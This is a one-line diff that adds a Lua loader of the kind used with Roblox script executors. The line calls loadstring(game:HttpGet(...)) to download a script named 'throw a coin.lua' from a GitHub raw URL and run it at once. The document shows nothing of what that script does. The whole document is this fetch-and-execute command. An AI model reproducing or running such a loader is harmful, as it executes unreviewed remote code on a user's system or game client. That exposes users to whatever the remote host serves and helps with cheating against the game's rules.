@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/lakamkam5-lab/throwacoin/refs/heads/main/throw%20a%20coin.lua"))
